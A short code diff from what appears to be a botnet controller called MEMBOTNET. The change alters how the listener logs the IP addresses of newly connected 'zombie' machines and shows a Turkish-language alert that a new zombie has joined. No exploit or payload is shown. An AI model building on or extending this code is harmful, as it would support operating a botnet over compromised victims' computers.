@@ -62,9 +62,9 @@ def listen_loop():
             pass
         try:
             with open(current_path+'/zombies/zm.log', 'a') as f:
-                f.write(str(ip)+'\n')
+                f.write(str(ip[0])+'\n')
         except:
             pass
-        toast.show_toast(f"MEMBOTNET", f"Sunucu: {local}, Yeni zombi bağlandı!, IP adres: {str(ip)}",duration=6,icon_path=current_path+'/icons/ninja_icon.ico')
+        toast.show_toast(f"MEMBOTNET", f"Sunucu: {local}, Yeni zombi bağlandı!, IP adres: {str(ip[0])}",duration=6,icon_path=current_path+'/icons/ninja_icon.ico')
 
 listen_loop()
